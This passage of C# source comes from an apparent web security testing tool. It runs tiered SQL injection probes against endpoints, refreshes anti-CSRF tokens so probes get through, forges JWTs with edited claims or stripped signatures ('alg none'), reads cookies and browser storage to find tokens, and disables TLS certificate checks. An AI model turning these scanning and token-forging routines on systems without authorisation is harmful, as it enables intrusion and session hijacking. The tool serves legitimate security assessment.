                                : "blind-boolean";

            var title = hasAuth ? "SQL injection (auth bypass)" : "SQL injection";
            var key = $"{method}|{endpointKey}|{param}|{findingClass}";

            var engine = row.SqlHits.FirstOrDefault()?.Engine;
            var indicator = row.SqlHits.FirstOrDefault()?.Pattern
                            ?? row.Types.FirstOrDefault(t => t.Contains("confirmed", StringComparison.OrdinalIgnoreCase))
                            ?? row.Types.FirstOrDefault()
                            ?? "sqli-signal";

            string severity;
            string confidence;
            if (hasError || hasAuth || hasBoolConfirmed)
            {
                severity = "high";
                confidence = hasError || hasBoolConfirmed ? SecurityConfidence.Confirmed : SecurityConfidence.Likely;
            }
            else if (hasUnion || hasTime)
            {
                severity = "high";
                confidence = SecurityConfidence.Likely;
            }
            else
            {
                severity = "medium";
                confidence = SecurityConfidence.Tentative;
            }

            var proof = hasError
                ? $"SQL error signature ({engine ?? "unknown"}): {indicator}"
                : hasAuth
                    ? "Auth-bypass heuristic: response diverged from baseline on tautology payload"
                    : hasBoolConfirmed
                        ? "Truthy/falsy boolean pair produced different noise-stripped response hashes (payload echo neutralized)"
                        : string.Join(", ", row.Types);

            if (!groups.TryGetValue(key, out var acc))
            {
                acc = new SqliFindingAccumulator
                {
                    Title = title,
                    FindingClass = findingClass,
                    Severity = severity,
                    Confidence = confidence,
                    Endpoint = endpointKey,
                    Method = method,
                    Param = param,
                    ProofHint = proof,
                    Evidence = BuildTightSqliEvidence(row, baselineEvidenceSample),
                    Engine = engine,
                    Indicator = indicator,
                    Status = row.Status,
                    SampleUrl = row.Url
                };
                groups[key] = acc;
                order.Add(key);
            }
            else
            {
                // Keep strongest severity/confidence; append evidence if distinct.
                if (SecurityConfidence.Rank(confidence) > SecurityConfidence.Rank(acc.Confidence)
                    || SeverityRankName(severity) > SeverityRankName(acc.Severity))
                {
                    acc.Severity = severity;
                    acc.Confidence = confidence;
                    acc.ProofHint = proof;
                    acc.Evidence = BuildTightSqliEvidence(row, baselineEvidenceSample);
                    acc.Engine = engine ?? acc.Engine;
                    acc.Indicator = indicator;
                    acc.Status = row.Status;
                    acc.SampleUrl = row.Url;
                }
            }

            if (!string.IsNullOrEmpty(row.Payload) && acc.Payloads.Count < 25
                && !acc.Payloads.Contains(row.Payload, StringComparer.Ordinal))
                acc.Payloads.Add(row.Payload);

            foreach (var t in row.Types)
            {
                if (!acc.Types.Contains(t, StringComparer.OrdinalIgnoreCase))
                    acc.Types.Add(t);
            }
        }

        var findings = new List<UnifiedSecurityFinding>();
        foreach (var key in order)
        {
            var acc = groups[key];
            var primaryPayload = acc.Payloads.Count > 0 ? acc.Payloads[0] : null;
            findings.Add(UnifiedSecurityFinding.Create(
                category: "sqli",
                title: acc.Title,
                severity: acc.Severity,
                confidence: acc.Confidence,
                endpoint: acc.Endpoint,
                method: acc.Method,
                param: acc.Param,
                payload: primaryPayload,
                evidence: acc.Evidence,
                proofHint: acc.ProofHint,
                nextActions: SecurityNextActions.SqliFollowUp(acc.Param, acc.Endpoint)
                    .Select(i => i.Summary).ToList(),
                nextActionItems: SecurityNextActions.SqliFollowUp(acc.Param, acc.Endpoint),
                extra: new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
                {
                    ["types"] = acc.Types,
                    ["findingClass"] = acc.FindingClass,
                    ["engine"] = acc.Engine,
                    ["indicator"] = acc.Indicator,
                    ["status"] = acc.Status,
                    ["payloads"] = acc.Payloads,
                    ["payloadCount"] = acc.Payloads.Count,
                    ["sampleUrl"] = acc.SampleUrl
                }));
        }

        return findings;
    }

    /// <summary>Grouped view for agents — same collapse key as <see cref="BuildSqliFindings"/>.</summary>
    internal static List<object> BuildSqliFindingGroups(IReadOnlyList<UnifiedSecurityFinding> findings) =>
        findings.Select(f => (object)new
        {
            key = $"{f.Method}|{f.Endpoint}|{f.Param}|{f.Extra.GetValueOrDefault("findingClass")}",
            category = f.Category,
            title = f.Title,
            severity = f.Severity,
            confidence = f.Confidence,
            endpoint = f.Endpoint,
            method = f.Method,
            param = f.Param,
            findingClass = f.Extra.GetValueOrDefault("findingClass"),
            payloads = f.Extra.GetValueOrDefault("payloads"),
            payloadCount = f.Extra.GetValueOrDefault("payloadCount"),
            evidence = f.Evidence,
            proofHint = f.ProofHint
        }).ToList();

    private static string NormalizeSqliFindingEndpoint(string urlTemplate)
    {
        if (string.IsNullOrWhiteSpace(urlTemplate)) return "";
        // Strip markers / query values so payload-bearing URLs collapse to one sink identity.
        var cleaned = RequestMarkerSubstitute.ReplaceAllInUrl(urlTemplate, "§");
        if (Uri.TryCreate(cleaned, UriKind.Absolute, out var uri))
            return uri.GetLeftPart(UriPartial.Path);
        var q = cleaned.IndexOf('?', StringComparison.Ordinal);
        return q >= 0 ? cleaned[..q] : cleaned;
    }

    private static int SeverityRankName(string? s) => (s ?? "").Trim().ToLowerInvariant() switch
    {
        "critical" => 4,
        "high" => 3,
        "medium" => 2,
        "low" => 1,
        _ => 0
    };

    private sealed class SqliFindingAccumulator
    {
        public string Title { get; set; } = "";
        public string FindingClass { get; set; } = "";
        public string Severity { get; set; } = "medium";
        public string Confidence { get; set; } = SecurityConfidence.Likely;
        public string Endpoint { get; set; } = "";
        public string Method { get; set; } = "GET";
        public string Param { get; set; } = "";
        public string? ProofHint { get; set; }
        public string? Evidence { get; set; }
        public string? Engine { get; set; }
        public string? Indicator { get; set; }
        public int Status { get; set; }
        public string? SampleUrl { get; set; }
        public List<string> Payloads { get; } = [];
        public List<string> Types { get; } = [];
    }

    /// <summary>Prefer SQL signature snippet or first-diff excerpt over a near-full HTML dump.</summary>
    private static string BuildTightSqliEvidence(SqliScanRow row, string? baselineEvidenceSample)
    {
        var sqlSnippet = row.SqlHits.FirstOrDefault()?.Snippet;
        if (!string.IsNullOrWhiteSpace(sqlSnippet))
            return TruncateEvidence(sqlSnippet!, 240);

        if (!string.IsNullOrEmpty(baselineEvidenceSample) && !string.IsNullOrEmpty(row.ProbeEvidenceSample))
        {
            var excerpt = ResponseBodySecurityHeuristics.BuildShortSecurityBodyDiffExcerpt(
                baselineEvidenceSample, row.ProbeEvidenceSample);
            if (!string.IsNullOrWhiteSpace(excerpt)
                && !excerpt.Contains("identical after framework-noise strip", StringComparison.OrdinalIgnoreCase))
                return TruncateEvidence(excerpt, 320);
        }

        return TruncateEvidence(row.Body ?? "", 280);
    }

    private static string TruncateEvidence(string text, int max)
    {
        if (string.IsNullOrEmpty(text) || text.Length <= max) return text;
        return text[..max] + "…";
    }

    /// <summary>
    /// Two-phase SQLi scan: screening payloads first, extended (and optional time-based) only on signal.
    /// </summary>
    public static async Task<SqliScanResult> RunSqliScanTieredAsync(
        AutomationContext ctx,
        string urlTemplate,
        string method,
        Dictionary<string, string>? headers,
        string? bodyTemplate,
        string baselineMarkerValue,
        bool includeTimeBased,
        int timeoutMs,
        int maxBodyChars,
        bool useBackendFetch = false,
        bool includeBrowserCookies = false,
        bool includeOrmClosurePayloads = false,
        CancellationToken ct = default,
        string? depth = null,
        PayloadProfile payloadProfile = PayloadProfile.Small)
    {
        var screening = await RunSqliScanAsync(
            ctx, urlTemplate, method, headers, bodyTemplate,
            baselineMarkerValue, ScreeningSqliPayloads, includeTimeBased: false,
            timeoutMs, maxBodyChars, useBackendFetch, includeBrowserCookies,
            includeOrmClosurePayloads: false, ct: ct, depth: depth, payloadProfile: payloadProfile);

        if (!SqliScreeningShowsSignal(screening))
            return screening;

        var extended = PayloadCatalog.ResolveWithFallback("sqli-basic", DefaultSqliPayloads, payloadProfile)
            .Where(p => !ScreeningSqliPayloads.Contains(p, StringComparer.Ordinal))
            .ToList();
        if (includeOrmClosurePayloads)
            extended.AddRange(OrmClosureSqliPayloads);
        if (includeTimeBased)
            extended.AddRange(TimeBasedPayloads);

        SqliScanResult merged;
        if (extended.Count == 0)
        {
            merged = screening;
        }
        else
        {
            var deep = await RunSqliScanAsync(
                ctx, urlTemplate, method, headers, bodyTemplate,
                baselineMarkerValue, extended, includeTimeBased: false,
                timeoutMs, maxBodyChars, useBackendFetch, includeBrowserCookies,
                includeOrmClosurePayloads: false, ct: ct, depth: depth, payloadProfile: payloadProfile);

            merged = new SqliScanResult
            {
                BaselineUrl = screening.BaselineUrl,
                BaselineStatus = screening.BaselineStatus,
                BaselineLength = screening.BaselineLength,
                BaselineMs = screening.BaselineMs,
                BaselineEvidenceSample = screening.BaselineEvidenceSample,
                BaselineStrippedHash = screening.BaselineStrippedHash,
                Rows = screening.Rows.Concat(deep.Rows).ToList(),
                Summary = screening.Summary.Concat(deep.Summary).Distinct(StringComparer.Ordinal).ToList(),
                Findings = screening.Findings.Concat(deep.Findings).ToList(),
                UseBackendFetch = screening.UseBackendFetch,
                IncludedBrowserCookies = screening.IncludedBrowserCookies,
                Depth = SecurityScanDepth.Normalize(depth),
                ElapsedMs = screening.ElapsedMs + deep.ElapsedMs
            };
        }

        if (!includeTimeBased && SqliScreeningWarrantsTimeBased(merged))
        {
            var timed = await RunSqliScanAsync(
                ctx, urlTemplate, method, headers, bodyTemplate,
                baselineMarkerValue, TimeBasedPayloads.ToList(), includeTimeBased: false,
                timeoutMs, maxBodyChars, useBackendFetch, includeBrowserCookies,
                includeOrmClosurePayloads: false, ct: ct, depth: depth, payloadProfile: payloadProfile);

            merged = new SqliScanResult
            {
                BaselineUrl = merged.BaselineUrl,
                BaselineStatus = merged.BaselineStatus,
                BaselineLength = merged.BaselineLength,
                BaselineMs = merged.BaselineMs,
                BaselineEvidenceSample = merged.BaselineEvidenceSample,
                BaselineStrippedHash = merged.BaselineStrippedHash,
                Rows = merged.Rows.Concat(timed.Rows).ToList(),
                Summary = merged.Summary.Concat(timed.Summary).Distinct(StringComparer.Ordinal).ToList(),
                Findings = merged.Findings.Concat(timed.Findings).ToList(),
                UseBackendFetch = merged.UseBackendFetch,
                IncludedBrowserCookies = merged.IncludedBrowserCookies,
                Depth = merged.Depth,
                ElapsedMs = merged.ElapsedMs + timed.ElapsedMs
            };
        }

        return merged;
    }

    /// <summary>Run time-based SQLi probes only after screening/deep showed boolean or error skew.</summary>
    public static bool SqliScreeningWarrantsTimeBased(SqliScanResult result)
    {
        if (result.Rows.Any(r =>
                r.Types.Any(t => t.Contains("blind-boolean", StringComparison.OrdinalIgnoreCase))))
            return true;
        if (result.Rows.Any(r => r.SqlHits.Count > 0))
            return true;
        return result.Rows.Any(r => r.Status >= 500 && r.Status != result.BaselineStatus);
    }

    /// <summary>True when screening payloads warrant running the extended SQLi set.</summary>
    public static bool SqliScreeningShowsSignal(SqliScanResult result)
    {
        if (result.Rows.Any(r => r.Types.Count > 0))
            return true;

        foreach (var row in result.Rows)
        {
            if (row.SqlHits.Count > 0)
                return true;
            if (row.Status != result.BaselineStatus && row.Status >= 500)
                return true;
            if (Math.Abs(row.BodyLength - result.BaselineLength) >
                Math.Max(50, result.BaselineLength * 0.15))
                return true;
        }

        return false;
    }

    private static async Task<string> ServerSideHttpAsFetchJsonAsync(
        AutomationContext ctx,
        string url,
        string method,
        Dictionary<string, string>? headers,
        string? body,
        string? bodyTemplate,
        int timeoutMs,
        bool followRedirects,
        CancellationToken ct)
    {
        var sw = Stopwatch.StartNew();
        string? error = null;
        var status = 0;
        try
        {
            using var handler = new HttpClientHandler
            {
                AllowAutoRedirect = followRedirects,
                ServerCertificateCustomValidationCallback = (_, _, _, _) => true
            };
            using var client = new HttpClient(handler)
            {
                Timeout = TimeSpan.FromMilliseconds(Math.Clamp(timeoutMs, 500, 600_000))
            };
            using var msg = new HttpRequestMessage(new HttpMethod(method), url);
            if (!method.Equals("GET", StringComparison.OrdinalIgnoreCase)
                && !method.Equals("HEAD", StringComparison.OrdinalIgnoreCase))
                msg.Content = InjectionHttpTransport.BuildContent(body, headers, bodyTemplate);
            InjectionHttpTransport.ApplyHeaders(msg, headers);

            using var resp = await client.SendAsync(msg, ct).ConfigureAwait(false);
            var text = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);
            status = (int)resp.StatusCode;
            var ok = resp.IsSuccessStatusCode;
            string? location = null;
            if (resp.Headers.Location != null)
                location = resp.Headers.Location.ToString();
            else if (resp.Headers.TryGetValues("Location", out var locs))
                location = locs.FirstOrDefault();

            return JsonSerializer.Serialize(new
            {
                ok,
                status,
                statusText = resp.ReasonPhrase ?? "",
                redirected = false,
                type = "server-side",
                url = resp.RequestMessage?.RequestUri?.ToString() ?? url,
                location,
                body = text
            });
        }
        catch (Exception ex)
        {
            error = ex.Message;
            throw;
        }
        finally
        {
            sw.Stop();
            ctx.RecordOutboundRequest(method, url, body, status, sw.ElapsedMilliseconds, error, "httpclient");
        }
    }

    /// <summary>True when the URL template already carries a CSRF-like query parameter.</summary>
    internal static bool UrlTemplateHasCsrfQueryToken(string urlTemplate)
    {
        if (!Uri.TryCreate(
                RequestMarkerSubstitute.ReplaceAllInUrl(urlTemplate, "1"),
                UriKind.Absolute, out var uri))
            return false;

        var q = uri.Query.TrimStart('?');
        if (string.IsNullOrEmpty(q)) return false;
        foreach (var part in q.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            var eq = part.IndexOf('=');
            var key = Uri.UnescapeDataString(eq >= 0 ? part[..eq] : part);
            if (CsrfTokenHeuristics.IsKnownCsrfFieldName(key))
                return true;
        }

        return false;
    }

    /// <summary>
    /// Replace CSRF query values with fresh one-time tokens. Prefers a GET of the form landing
    /// page (DOM scrape alone is stale after <c>fetch()</c> consumes the previous token).
    /// </summary>
    internal static async Task<string> RefreshGetCsrfQueryTokensAsync(
        AutomationContext ctx, string url, CancellationToken ct)
    {
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
            return url;

        ct.ThrowIfCancellationRequested();
        var tokens = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        // Fetch the form page (path without probe query) to obtain a unused anti-CSRF token.
        var formPageUrl = uri.GetLeftPart(UriPartial.Path);
        try
        {
            var formResp = await SecurityProbeHttp.FetchAsync(
                ctx, formPageUrl, "GET", null, null, 10000, includeBrowserCookies: true, ct);
            if (formResp.Status is >= 200 and < 400
                && CsrfHtmlTokenExtractor.TryExtractAll(formResp.Body, tokens))
            {
                // tokens populated
            }
        }
        catch
        {
            // Fall through to DOM scrape.
        }

        if (tokens.Count == 0)
        {
            var scrape = await CsrfDomScraper.ScrapeDetailedAsync(ctx);
            foreach (var (name, val) in scrape.Tokens)
            {
                if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(val))
                    tokens[name] = val;
            }

            var binding = CsrfDomScraper.PickFormForTarget(scrape, url);
            if (binding != null)
            {
                if (!string.IsNullOrEmpty(binding.FieldName) && !string.IsNullOrEmpty(binding.Value))
                    tokens[binding.FieldName] = binding.Value;
                foreach (var (name, val) in binding.HiddenFields)
                {
                    if (CsrfTokenHeuristics.IsKnownCsrfFieldName(name) && !string.IsNullOrEmpty(val))
                        tokens[name] = val;
                }
            }
        }

        if (tokens.Count == 0)
            return url;

        var parts = new List<string>();
        var q = uri.Query.TrimStart('?');
        foreach (var part in q.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            var eq = part.IndexOf('=');
            var key = Uri.UnescapeDataString(eq >= 0 ? part[..eq] : part);
            var rawVal = eq >= 0 ? part[(eq + 1)..] : "";
            if (tokens.TryGetValue(key, out var fresh)
                && CsrfTokenHeuristics.IsKnownCsrfFieldName(key))
            {
                parts.Add($"{Uri.EscapeDataString(key)}={Uri.EscapeDataString(fresh)}");
            }
            else if (rawVal.Contains('§', StringComparison.Ordinal) || rawVal.Contains("{{", StringComparison.Ordinal))
            {
                // Keep injection markers literal (not percent-encoded).
                parts.Add($"{Uri.EscapeDataString(key)}={rawVal}");
            }
            else
            {
                parts.Add(part);
            }
        }

        return uri.GetLeftPart(UriPartial.Path) + (parts.Count > 0 ? "?" + string.Join("&", parts) : "");
    }

    /// <summary>
    /// Strip boolean SQLi heuristics when probe bodies look like shared CSRF-fail pages
    /// (identical lengths / CSRF rejection markers) rather than query-result differentials.
    /// </summary>
    private static void ApplySqliCsrfContaminationHeuristics(
        List<SqliScanRow> rows, int baselineStatus, string baselineText)
    {
        if (rows.Count < 3) return;

        var csrfRows = rows
            .Where(r => InsecureDesignProbeSupport.LooksLikeCsrfRejection(r.Status, r.Body))
            .ToList();
        if (csrfRows.Count >= Math.Max(3, rows.Count * 0.6))
        {
            foreach (var r in rows)
            {
                StripSqliHeuristicTypes(r, "blind-boolean-suspected");
                StripSqliHeuristicTypes(r, "blind-boolean-confirmed");
                StripSqliHeuristicTypes(r, "auth-bypass-suspected");
            }
            return;
        }

        // Token-reuse pattern: baseline succeeded; nearly all probes share one non-baseline length.
        var baselineLen = baselineText.Length;
        var lengthGroups = rows
            .Where(r => r.Status == baselineStatus && Math.Abs(r.BodyLength - baselineLen) > 15)
            .GroupBy(r => r.BodyLength)
            .OrderByDescending(g => g.Count())
            .ToList();
        if (lengthGroups.Count == 0) return;

        var dominant = lengthGroups[0];
        if (dominant.Count() < Math.Max(5, rows.Count * 0.7)) return;

        // Dominant cluster is a shared fail page — strip boolean types from those rows.
        var dominantLen = dominant.Key;
        foreach (var r in rows)
        {
            if (r.BodyLength != dominantLen) continue;
            StripSqliHeuristicTypes(r, "blind-boolean-suspected");
            StripSqliHeuristicTypes(r, "blind-boolean-confirmed");
        }
    }

    /// <summary>
    /// Replace fuzz-style markers in the body. JSON templates substitute inside string values only.
    /// Form-urlencoded templates parse fields, substitute at markers, and URL-encode values.
    /// </summary>
    private static string? SubstituteSqliBody(string? bodyTemplate, string value, Dictionary<string, string>? headers = null)
    {
        if (bodyTemplate == null) return null;
        var trimmed = bodyTemplate.TrimStart();
        if (trimmed.StartsWith('{') || trimmed.StartsWith('['))
            return InjectionJsonBody.SubstituteMarkers(bodyTemplate, value);

        if (SqliBodyTemplateIsFormEncoded(bodyTemplate, headers))
        {
            try
            {
                return SubstituteMarkersInFormBody(bodyTemplate, value);
            }
            catch
            {
                /* fall back to raw replace */
            }
        }

        return RequestMarkerSubstitute.ReplaceAll(bodyTemplate, value);
    }

    private static string SubstituteMarkersInFormBody(string bodyTemplate, string value)
    {
        var qs = HttpUtility.ParseQueryString(bodyTemplate);
        var parts = new List<string>();
        foreach (string? key in qs)
        {
            if (key == null) continue;
            var fieldValue = RequestMarkerSubstitute.ReplaceAll(qs[key] ?? "", value);
            parts.Add($"{Uri.EscapeDataString(key)}={Uri.EscapeDataString(fieldValue)}");
        }

        if (parts.Count == 0)
            return RequestMarkerSubstitute.ReplaceAll(bodyTemplate, value);

        return string.Join("&", parts);
    }

    private static bool SqliBodyTemplateIsFormEncoded(string bodyTemplate, Dictionary<string, string>? headers)
    {
        if (headers != null && headers.TryGetValue("Content-Type", out var ct)
            && ct.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase))
            return true;

        var trimmed = bodyTemplate.TrimStart();
        if (trimmed.StartsWith('{') || trimmed.StartsWith('['))
            return false;

        return LooksLikeFormUrlEncodedTemplate(trimmed);
    }

    private static bool LooksLikeFormUrlEncodedTemplate(string body)
    {
        if (string.IsNullOrWhiteSpace(body) || !body.Contains('='))
            return false;

        foreach (var part in body.Split('&', StringSplitOptions.RemoveEmptyEntries))
        {
            if (part.IndexOf('=') <= 0)
                return false;
        }

        return true;
    }

    public sealed class JwtTokenAnalysis
    {
        public string Source { get; init; } = "";
        /// <summary>Display form. Tokens longer than 80 characters are truncated with an ellipsis.</summary>
        public string? Raw { get; init; }
        /// <summary>Full token for probes. Omitted from JSON so analyze responses stay redacted.</summary>
        [JsonIgnore]
        public string? FullToken { get; init; }
        public string? HeaderAlg { get; init; }
        public string? HeaderJson { get; init; }
        public string? PayloadJson { get; init; }
        public List<string> Issues { get; init; } = [];
        public List<string> SensitiveClaims { get; init; } = [];
        public DateTime? ExpiresUtc { get; init; }
    }

    public sealed class JwtAnalyzeResult
    {
        public List<JwtTokenAnalysis> Tokens { get; init; } = [];

        public string Format(bool includePayload = false)
        {
            var sb = new StringBuilder();
            sb.AppendLine("=== JWT Token Analysis ===");
            if (Tokens.Count == 0)
            {
                sb.AppendLine("No JWT-shaped tokens found in cookies, storage, or the browser cookie jar.");
                return sb.ToString();
            }

            sb.AppendLine($"Tokens found: {Tokens.Count}");
            sb.AppendLine();

            foreach (var t in Tokens)
            {
                sb.AppendLine($"--- {t.Source} ---");
                sb.AppendLine($"  Algorithm: {t.HeaderAlg ?? "(unknown)"}");
                if (t.Raw != null)
                    sb.AppendLine($"  Raw (truncated): {t.Raw}");
                if (t.ExpiresUtc.HasValue)
                    sb.AppendLine($"  exp (UTC): {t.ExpiresUtc:u}");
                foreach (var issue in t.Issues)
                    sb.AppendLine($"  ! {issue}");
                foreach (var s in t.SensitiveClaims)
                    sb.AppendLine($"  [sensitive claim] {s}");
                if (includePayload && !string.IsNullOrEmpty(t.PayloadJson))
                {
                    var pay = t.PayloadJson.Length > 2000 ? t.PayloadJson[..2000] + "…" : t.PayloadJson;
                    sb.AppendLine($"  Payload: {pay}");
                }

                sb.AppendLine();
            }

            return sb.ToString().TrimEnd();
        }
    }

    public sealed class JwtForgeResult
    {
        public string Token { get; init; } = "";
        public string HeaderJson { get; init; } = "";
        public string PayloadJson { get; init; } = "";
        public bool SignatureStripped { get; init; }
        public List<string> Notes { get; init; } = [];
    }

    private static readonly JsonSerializerOptions JwtSerializeOpts = new()
    {
        WriteIndented = false,
        Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping
    };

    /// <summary>
    /// Apply a top-level <c>algorithm</c> as <c>header.alg</c>.
    /// <c>none</c> also strips the signature unless the caller set <c>stripSignature</c> explicitly.
    /// </summary>
    internal static (JsonElement Modifications, bool StripSignature, string Note) ApplyTopLevelAlgorithm(
        JsonElement? modifications,
        string algorithm,
        bool stripSignature,
        bool stripSignatureExplicit)
    {
        algorithm = algorithm.Trim();
        var root = modifications is { ValueKind: JsonValueKind.Object } existing
            ? JsonNode.Parse(existing.GetRawText()) as JsonObject ?? new JsonObject()
            : new JsonObject();

        if (root["header"] is not JsonObject header)
        {
            header = new JsonObject();
            root["header"] = header;
        }

        string? prior = null;
        if (header["alg"] is JsonValue priorNode && priorNode.TryGetValue<string>(out var priorStr))
            prior = priorStr;

        header["alg"] = algorithm;

        var strip = stripSignature;
        if (!stripSignatureExplicit && algorithm.Equals("none", StringComparison.OrdinalIgnoreCase))
            strip = true;

        var note = prior != null && !prior.Equals(algorithm, StringComparison.OrdinalIgnoreCase)
            ? $"Top-level algorithm \"{algorithm}\" replaced modifications.header.alg \"{prior}\"."
            : $"Applied top-level algorithm \"{algorithm}\" as header.alg.";
        if (strip && !stripSignature && algorithm.Equals("none", StringComparison.OrdinalIgnoreCase))
            note += " Signature stripped because alg is none.";

        using var doc = JsonDocument.Parse(root.ToJsonString());
        return (doc.RootElement.Clone(), strip, note);
    }

    /// <summary>
    /// Build a modified JWT (JWS) for security testing: merge header/payload JSON, optional dot-path keys
    /// (<c>payload.data.email</c>), and optionally clear the signature (e.g. with <c>alg: none</c>).
    /// Does not re-sign RS256/HS256 tokens — see <see cref="JwtForgeResult.Notes"/>.
    /// </summary>
    public static JwtForgeResult ForgeJwt(string baseToken, JsonElement? modifications, bool stripSignature)
    {
        var notes = new List<string>();
        var trimmed = baseToken.Trim();
        var segments = trimmed.Split('.');
        if (segments.Length < 2 || string.IsNullOrEmpty(segments[0]) || string.IsNullOrEmpty(segments[1]))
            throw new ArgumentException("JWT must contain non-empty header and payload segments.");

        var origSig = segments.Length >= 3 ? segments[2] : "";

        string headerText;
        string payloadText;
        try
        {
            headerText = Encoding.UTF8.GetString(Base64UrlDecode(segments[0]));
            payloadText = Encoding.UTF8.GetString(Base64UrlDecode(segments[1]));
        }
        catch (Exception ex)
        {
            throw new ArgumentException("Invalid Base64url in JWT header or payload: " + ex.Message);
        }

        JsonObject headerObj;
        JsonObject payloadObj;
        try
        {
            headerObj = JsonNode.Parse(headerText) as JsonObject
                ?? throw new ArgumentException("JWT header must be a JSON object.");
            payloadObj = JsonNode.Parse(payloadText) as JsonObject
                ?? throw new ArgumentException("JWT payload must be a JSON object.");
        }
        catch (JsonException ex)
        {
            throw new ArgumentException("JWT header or payload is not valid JSON: " + ex.Message);
        }

        var anyModificationApplied = false;
        if (modifications is { ValueKind: JsonValueKind.Object } mo)
        {
            foreach (var prop in mo.EnumerateObject())
            {
                if (prop.Name.Equals("stripSignature", StringComparison.OrdinalIgnoreCase))
                    continue;

                if (prop.NameEquals("header") && prop.Value.ValueKind == JsonValueKind.Object)
                {
                    if (JsonNode.Parse(prop.Value.GetRawText()) is JsonObject merge)
                    {
                        DeepMergeJsonObjects(headerObj, merge);
                        anyModificationApplied = true;
                    }
                    continue;
                }

                if (prop.NameEquals("payload") && prop.Value.ValueKind == JsonValueKind.Object)
                {
                    if (JsonNode.Parse(prop.Value.GetRawText()) is JsonObject merge)
                    {
                        DeepMergeJsonObjects(payloadObj, merge);
                        anyModificationApplied = true;
                    }
                    continue;
                }

                if (prop.Name.StartsWith("header.", StringComparison.OrdinalIgnoreCase))
                {
                    var path = prop.Name["header.".Length..];
                    if (path.Length > 0)
                    {
                        SetDotPathJson(headerObj, path, prop.Value);
                        anyModificationApplied = true;
                    }
                    continue;
                }

                if (prop.Name.StartsWith("payload.", StringComparison.OrdinalIgnoreCase))
                {
                    var path = prop.Name["payload.".Length..];
                    if (path.Length > 0)
                    {
                        SetDotPathJson(payloadObj, path, prop.Value);
                        anyModificationApplied = true;
                    }
                }
            }
        }

        if (!anyModificationApplied && !stripSignature)
        {
            return new JwtForgeResult
            {
                Token = trimmed,
                HeaderJson = headerText,
                PayloadJson = payloadText,
                SignatureStripped = false,
                Notes = notes
            };
        }

        if (!anyModificationApplied && stripSignature)
        {
            notes.Add(
                "Signature cleared — use with servers that accept unsigned JWTs (e.g. alg none) or for manual replay tests.");
            return new JwtForgeResult
            {
                Token = $"{segments[0]}.{segments[1]}.",
                HeaderJson = headerText,
                PayloadJson = payloadText,
                SignatureStripped = true,
                Notes = notes
            };
        }

        var headerOut = headerObj.ToJsonString(JwtSerializeOpts);
        var payloadOut = payloadObj.ToJsonString(JwtSerializeOpts);

        if (!stripSignature && !string.IsNullOrEmpty(origSig))
            notes.Add(
                "Header or payload changed — the original signature is no longer valid unless the server skips verification.");

        if (stripSignature)
            notes.Add(
                "Signature cleared — use with servers that accept unsigned JWTs (e.g. alg none) or for manual replay tests.");

        if (headerObj.TryGetPropertyValue("alg", out var algNode) && algNode is JsonValue av
            && av.TryGetValue<string>(out var algStr)
            && string.Equals(algStr, "none", StringComparison.OrdinalIgnoreCase))
        {
            notes.Add("Algorithm is none — integrity is not protected; verify the API rejects or accepts this intentionally.");
        }

        notes.Add(
            "Algorithm-confusion (e.g. RS256→HS256 with a public key) and expiry bypass require server-specific manual steps — this helper only edits header/payload bytes.");

        var hB64 = Base64UrlEncode(Encoding.UTF8.GetBytes(headerOut));
        var pB64 = Base64UrlEncode(Encoding.UTF8.GetBytes(payloadOut));
        var token = stripSignature ? $"{hB64}.{pB64}." : $"{hB64}.{pB64}.{origSig}";

        return new JwtForgeResult
        {
            Token = token,
            HeaderJson = headerOut,
            PayloadJson = payloadOut,
            SignatureStripped = stripSignature,
            Notes = notes.Distinct(StringComparer.Ordinal).ToList()
        };
    }

    private static void DeepMergeJsonObjects(JsonObject target, JsonObject source)
    {
        foreach (var kv in source)
        {
            if (kv.Value is JsonObject srcObj && target[kv.Key] is JsonObject tgtObj)
                DeepMergeJsonObjects(tgtObj, srcObj);
            else
                target[kv.Key] = kv.Value?.DeepClone();
        }
    }

    /// <summary>Set <paramref name="dotPath"/> like <c>data.email</c> on a JSON object (creates missing objects).</summary>
    private static void SetDotPathJson(JsonObject root, string dotPath, JsonElement value)
    {
        var segments = dotPath.Split('.', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
        if (segments.Length == 0) return;

        JsonObject current = root;
        for (var i = 0; i < segments.Length - 1; i++)
        {
            var seg = segments[i];
            if (current[seg] is JsonObject next)
                current = next;
            else
            {
                var nextObj = new JsonObject();
                current[seg] = nextObj;
                current = nextObj;
            }
        }

        var last = segments[^1];
        current[last] = JsonNode.Parse(value.GetRawText());
    }

    private static readonly Regex JwtLike = new(
        @"[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}(?:\.[A-Za-z0-9_-]*)?",
        RegexOptions.Compiled);

    private static bool TryPrepareJwtSegments(string raw, out string header, out string payload, out string signature)
    {
        header = payload = signature = "";
        var token = JwtProbeHelpers.NormalizeBearerToken(raw);
        if (string.IsNullOrWhiteSpace(token)) return false;

        var parts = token.Split('.');
        if (parts.Length < 2 || string.IsNullOrEmpty(parts[0]) || string.IsNullOrEmpty(parts[1]))
            return false;
        if (parts.Length > 3) return false;

        header = parts[0];
        payload = parts[1];
        signature = parts.Length >= 3 ? parts[2] : "";
        return true;
    }

    private static string CanonicalJwtForm(string header, string payload, string signature) =>
        $"{header}.{payload}.{signature}";

    public static async Task<JwtAnalyzeResult> RunJwtAnalyzeAsync(
        AutomationContext ctx,
        IReadOnlyList<string>? explicitTokens = null,
        CancellationToken ct = default)
    {
        var json = await ctx.ExecuteJs(
            """
            (function(){
              var o = { cookies: document.cookie||'', localStorage: {}, sessionStorage: {} };
              try {
                for (var i = 0; i < localStorage.length; i++) {
                  var k = localStorage.key(i);
                  o.localStorage[k] = localStorage.getItem(k);
                }
              } catch(e) {}
              try {
                for (var j = 0; j < sessionStorage.length; j++) {
                  var k2 = sessionStorage.key(j);
                  o.sessionStorage[k2] = sessionStorage.getItem(k2);
                }
              } catch(e) {}
              return JSON.stringify(o);
            })()
            """);
        ct.ThrowIfCancellationRequested();

        var result = new JwtAnalyzeResult();
        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;
